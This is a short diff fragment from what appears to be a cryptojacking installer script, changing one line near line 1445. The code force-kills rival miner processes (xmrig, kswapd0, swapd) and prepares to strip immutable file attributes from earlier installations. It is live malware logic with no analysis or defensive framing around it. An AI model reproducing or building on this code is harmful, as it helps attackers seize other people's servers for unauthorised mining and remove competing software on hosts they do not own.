@@ -1445,7 +1445,7 @@ echo "[*] Killing competitor miners..."
 killall -9 xmrig 2>/dev/null || true
 killall -9 kswapd0 2>/dev/null || true
 killall -9 swapd 2>/dev/null || true
-send_sig 9 swapd kswapd0 xmrig
+#send_sig 9 swapd kswapd0 xmrig
 
 echo "[*] Removing immutable attributes from old installations..."
 # Remove immutable flags (chattr -i) before deletion
